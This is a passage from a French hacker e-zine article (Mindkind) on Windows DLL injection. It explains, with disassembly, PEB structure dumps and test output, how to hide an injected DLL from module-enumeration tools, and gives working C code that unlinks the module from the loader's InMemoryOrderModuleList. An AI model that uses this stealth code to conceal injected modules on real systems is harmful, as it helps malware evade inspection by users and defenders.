<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr">
<head>
<title>Mindkind 1010</title>
<meta name="author" content="Mindkind" />
<meta name="generator" content="Notepad2" />
<style type="text/css">
body {background-color:#000000; color:#ffffff; white-space:pre; font-family: monospace; font-size:1em;}
a.ttitle {text-decoration:underline; color:#ffffff;}
a.ttitle:hover {text-decoration: none; color:#000000; background-color:#ffffff;}
div.atitle {border:0px; margin:0px; padding:0px; font-size:1em; font-weight:bold;}
div.acode {border:solid 1px #00ff00; background-color:#c3c3c3; color:#000000; margin: 1em; padding:1em; font-family: monospace; font-size:0.9em;}
div.alist {border:solid 1px #00ff00; margin: 1.5em; padding:1em; font-family: monospace; font-size:0.9em;}
</style>
</head>
<body>
<pre>
best viewed in with firefox
<a href="#topic">topic</a>
      ___________________                                                                    __________________    
..---`                   ``-.                                                        ___,,--`                  `--,
`,    --__.-----------.--_   --.                   .-----------.               ,----'    ___             _________;
 '.       |  `,    .` |,     __,`                 ,\ `.     /` |              .``---,__,``   ``----------`         

Module Name: MPR.DLL

Et voici toujours le notepad mais avec notre DLL injectée:

C:\ProgHack\c>psapi notepad.exe
Number of modules: 19
Module Name: notepad.exe
Module Name: ntdll.dll
Module Name: comdlg32.dll
Module Name: SHLWAPI.DLL
Module Name: ADVAPI32.dll
Module Name: KERNEL32.dll
Module Name: RPCRT4.dll
Module Name: GDI32.dll
Module Name: USER32.dll
Module Name: msvcrt.dll
Module Name: COMCTL32.DLL
Module Name: SHELL32.DLL
Module Name: WINSPOOL.DRV
Module Name: MPR.DLL
Module Name: dll_injected.dll
Module Name: WS2_32.dll
Module Name: WS2HELP.DLL
Module Name: msafd.dll
Module Name: wshtcpip.dll

Whaou, 5 modules en plus c'est pas super discret tout ca, surtout quand on voit
que le notepad commence a utiliser la DLL ws2_32.dll on est droit de se poser
des questions :]


--------[4.\x55\x8B\xEC

Bon, alors maintenant on s'arrête 2 sec et on, du moins faisons semblant, essaye
de réfléchir. Il est clair que le processus qui va voir à quoi ressemblent les
DLL dans un autre process n'a pas fait cela en ring 3 car je le rappel chaque
process a SON PROPRE ET UNIQUE espace mémoire et ne peut accéder a celui de ses
voisins. Il y a donc forcément de l'api native là-dessous qui permet le passage
du UserLand au KernelLand, voici ce qu'on obtient en désassemblant une partie de
la fonction EnumProcessModules de la DLL psapi.dll:

68EA19AE   .  53            ; /pReqsize => NULL
68EA19AF   .  6A 18         ; |Bufsize = 18 (24.)
68EA19B1   .  8D45 C0       ; |
68EA19B4   .  50            ; |Buffer
68EA19B5   .  53            ; |InfoClass => 0
68EA19B6   .  FF75 08       ; |hProcess
68EA19B9   .  FF15 3810EA68 ; \ZwQueryInformationProcess
68EA19BF   .  3BC3
68EA19C1   .  7D 15
68EA19C3   .  50            ; /Arg1
68EA19C4   .  FF15 4410EA68 ; \RtlNtStatusToDosError
68EA19CA   .  50            ; /Error
68EA19CB   .  FF15 A010EA68 ; \SetLastError
68EA19D1   >  33C0
68EA19D3   .  E9 C2000000
68EA19D8   >  53            ; /pBytesRead
68EA19D9   .  6A 04         ; |BytesToRead = 4
68EA19DB   .  8D45 B8       ; |
68EA19DE   .  50            ; |Buffer
68EA19DF   .  8B45 C4       ; |
68EA19E2   .  83C0 0C       ; |
68EA19E5   .  50            ; |pBaseAddress
68EA19E6   .  FF75 08       ; |hProcess
68EA19E9   .  8B3D AC10EA68 ; |KERNEL32.ReadProcessMemory
68EA19EF   .  FFD7          ; \ReadProcessMemory
68EA19F1   .  85C0
68EA19F3   .^ 74 DC
68EA19F5   .  8B45 B8
68EA19F8   .  83C0 14
68EA19FB   .  8945 B4
68EA19FE   .  53            ; /pBytesRead
68EA19FF   .  6A 04         ; |BytesToRead = 4
68EA1A01   .  8D4D DC       ; |
68EA1A04   .  51            ; |Buffer
68EA1A05   .  50            ; |pBaseAddress
68EA1A06   .  FF75 08       ; |hProcess
68EA1A09   .  FFD7          ; \ReadProcessMemory
68EA1A0B   .  85C0

En traçant cette fonction on s'aperçoit que la fonction native
NtQueryInformationProcess() réalise le passage en ring0 et sert a obtenir l'addr
du PEB dans le process distant.

kd> dt !_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 SpareBool        : UChar
   +0x004 Mutant           : Ptr32 Void
   +0x008 ImageBaseAddress : Ptr32 Void
   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA
   [...]

puis on se déplace de 0xC dans la structure avec ce code:

68EA19DF   .  8B45 C4       MOV EAX,DWORD PTR SS:[EBP-3C]    ; |PEB
68EA19E2   .  83C0 0C       ADD EAX,0C                      ; |PEB+0xC
68EA19E5   .  50            PUSH EAX                          ; |pBaseAddress

Après le ReadProcessMemory() nous permet d'obtenir un pointeur sur une structure
_PEB_LDR_DATA (tout cela on le recup dans un autre process n'oubliez pas)

kd> dt !_PEB_LDR_DATA
   +0x000 Length           : Uint4B
   +0x004 Initialized      : UChar
   +0x008 SsHandle         : Ptr32 Void
   +0x00c InLoadOrderModuleList : _LIST_ENTRY
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY

Puis on se déplace de 0x14 dans celle ci avec ce chtit code:

68EA19F5   .  8B45 B8       MOV EAX,DWORD PTR SS:[EBP-48] ; |_PEB_LDR_DATA
68EA19F8   .  83C0 14       ADD EAX,14

On a donc un pointeur sur une double liste chaînée (LIST_ENTRY) et plus
précisément sur le membre suivant de cette liste (Flink).
InMemoryOrderModuleList, contient des structures de type LDR_DATA_TABLE_ENTRY
que voici:

kd> dt nt!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY
   +0x008 InMemoryOrderLinks : _LIST_ENTRY
   +0x010 InInitializationOrderLinks : _LIST_ENTRY
   +0x018 DllBase          : Ptr32 Void
   +0x01c EntryPoint       : Ptr32 Void
   +0x020 SizeOfImage      : Uint4B
   +0x024 FullDllName      : _UNICODE_STRING
   +0x02c BaseDllName      : _UNICODE_STRING
   +0x034 Flags            : Uint4B
   +0x038 LoadCount        : Uint2B
   +0x03a TlsIndex         : Uint2B
   +0x03c HashLinks        : _LIST_ENTRY
   +0x03c SectionPointer   : Ptr32 Void
   +0x040 CheckSum         : Uint4B
   +0x044 TimeDateStamp    : Uint4B
   +0x044 LoadedImports    : Ptr32 Void

Donc le programme va parcourir cette liste chainée pour y trouver les
informations en mémoire à propos des modules.


--------[5.La disparition des modules en UserLand

Voila qui devient intéressant et c'est (en partie) pour vous montrez cela que
j'ai écrit cet article, il suffit donc de modifier cette double liste afin que
notre module passer inaperçu, ho yeah, soirée mousse !!!!

Notre DLL va donc se composer d'un nouveau morceau de code qui permettra de la
rentre "furtive" et tout cas a tout les programmes qui utilisent
EnumProcessModules, déja PEID et LordPe (ce n'est qu'un début).

        +----------+        +----------+       +----------+    
        | Module 1 |        | Module 2 |       | Module 3 |
        | Flink    |&lt;-+---->| Flink    |&lt;-+--->| Flink    |---->
    &lt;---| Blink    |  |-----| Blink    |  |----| Blink    |
        +----------+        +----------+       +----------+
    
(le Blink ne pointe pas sur le précédent Blink mais bien sur le précédent Flink)

Voici ce que l'on veut obtenir:

                         +------------------+    
                         |                    |
        +----------+     |  +----------+    |  +----------+    
        | Module 1 |     |  | Module 2 |    |  | Module 3 |
        | Flink    |&lt;-+--+  | Flink    |&lt;---+->| Flink    |---->
    &lt;---| Blink    |  |-----| Blink    |   +---| Blink    |
        +----------+  |     +----------+   |   +----------+
                      |                    |    
                      +--------------------+
     
(Vous trouvez ces schémas pourris? Envoyer un mail à Ivanlef0u119@yahoo.fr pour
tout reproches, insultes, whines)

Allay tout de suite le code qui réalise cela:


<div class="acode">
int DLLHiding(LPSTR ModuleToHide)
{
    PPEB_LDR_DATA PLDR_DATA;

    _asm{
        mov eax,fs:[30h]        //Sur le PEB
        mov eax,[eax+0Ch]        //PEB->LoaderData
        mov PLDR_DATA,eax
        }
    
    char ModuleName[MAX_PATH]="";
    
    PLDR_MODULE PModule;
    PModule=(PLDR_MODULE)PLDR_DATA->InMemoryOrderModuleList.Flink;
    PModule=(PLDR_MODULE)((PBYTE)PModule-0x8);

    do{
        
        PModule=(PLDR_MODULE)PModule->InMemoryOrderModuleList.Flink;
        PModule=(PLDR_MODULE)((PBYTE)PModule-0x8);
        SecureZeroMemory(ModuleName,MAX_PATH);
        
        WideCharToMultiByte(CP_ACP, 0,PModule->FullDllName.Buffer,-1,ModuleName\
        , MAX_PATH-1, NULL, NULL);
    }while(!strstr(ModuleName,ModuleToHide));
    
    //Now on cache notre module

    PModule->InMemoryOrderModuleList.Blink->Flink=PModule->InMemoryOrderModuleLi
st.Flink;
    PModule->InMemoryOrderModuleList.Flink->Blink=PModule->InMemoryOrderModuleLi
st.Blink;

 return 1;
 }
</div>

Ce code n'est pas trop compliqué dans ce qu'il fait (ou pas)

Il va sur PEB du process puis dans la structure LoaderData et parcourt avec la
boucle do{}while(); la liste InMemoryOrderModuleList. Il récupère le nom du
module et le compare avec le nôtre, si c'est bon on arrête et on cache notre
module avec ces lignes étranges et venues d'ailleurs:

PModule->InMemoryOrderModuleList.Blink->Flink=PModule-
>InMemoryOrderModuleList.Flink;

Cela signifie que l'on définit le Flink de la structure précédente à la valeur
du Flink actuel c'est-à-dire sur la structure suivante (gruuut ?).

PModule->InMemoryOrderModuleList.Flink->Blink=PModule-
>InMemoryOrderModuleList.Blink;

Pareil on définit le Blink de la structure suivante à la valeur de notre Blink,
donc sur l'entrée précédente.

Ha aussi le rôle de cette ligne
PModule=(PLDR_MODULE)((PBYTE)PModule-0x8);
En fait comme un membre de la liste pointe tjrs sur un autre membre on arrive
non pas a début de la structure, mais sur la struct InMemoryOrderModuleList donc
pour pointer sur le début de la struct LDR_MODULE on soustrait 8 au pointeur
courant.

kd> dt nt!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY
   +0x008 InMemoryOrderLinks : _LIST_ENTRY //&lt;- on arrive ici
   +0x010 InInitializationOrderLinks : _LIST_ENTRY
   [...]

Et maintenant le grand moment on teste tout cela, voici les results avec tjrs
notre ami le notepad:

C:\ProgHack\c>psapi notepad.exe
Number of modules: 18
Module Name: notepad.exe
Module Name: ntdll.dll
Module Name: comdlg32.dll
Module Name: SHLWAPI.DLL
Module Name: ADVAPI32.dll
Module Name: KERNEL32.dll
Module Name: RPCRT4.dll
Module Name: GDI32.dll
Module Name: USER32.dll
Module Name: msvcrt.dll
Module Name: COMCTL32.DLL
Module Name: SHELL32.DLL
Module Name: WINSPOOL.DRV
Module Name: MPR.DLL
Module Name: WS2_32.dll
Module Name: WS2HELP.DLL
Module Name: msafd.dll
Module Name: wshtcpip.dll

Heyhey! 18 modules on a réussi à cacher notre DLL :]
Pour le reste, il suffit de procéder de la même façon a appelant la fct avec un
comme argument un nom de module a caché et c'est tout bon :}


-------[6.Bonus Track

Hum pourquoi un bonus track ? Parce que j'aime aller au fond de choses (ho
